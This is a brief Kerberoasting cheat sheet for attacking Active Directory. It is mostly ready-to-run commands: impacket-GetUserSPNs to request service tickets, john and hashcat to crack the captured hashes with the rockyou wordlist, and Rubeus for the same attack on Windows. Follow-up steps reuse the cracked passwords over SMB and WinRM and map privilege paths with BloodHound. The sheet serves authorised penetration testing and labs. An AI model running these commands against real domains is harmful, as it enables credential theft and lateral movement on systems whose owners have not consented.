# Kerberoasting Cheat Sheet

Use only in authorized Active Directory labs and assessments.

## When It Applies

- You have valid domain credentials.
- Kerberos port `88` is reachable.
- Domain users or service accounts have SPNs.

## Find SPNs And Request Tickets

```bash
impacket-GetUserSPNs 'domain.local/user:password' -request -dc-ip dc_ip
```

Save hashes and crack:

```bash
john kerberoast.hashes --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast.hashes rockyou.txt
```

## Windows / Rubeus

```powershell
.\Rubeus.exe kerberoast /creduser:DOMAIN\user /credpassword:password
```

## Useful Follow-Ups

- Test cracked passwords against SMB and WinRM.
- Check if the account is reused for services, local admin, MSSQL, or scheduled tasks.
- Feed findings into BloodHound to see privilege paths.

## Related

- See [Active Directory Attack Path Cheat Sheet](Active%20Directory%20Attack%20Path%20Cheat%20Sheet.md)
- AS-REP roasting is different: it targets accounts without Kerberos pre-authentication.

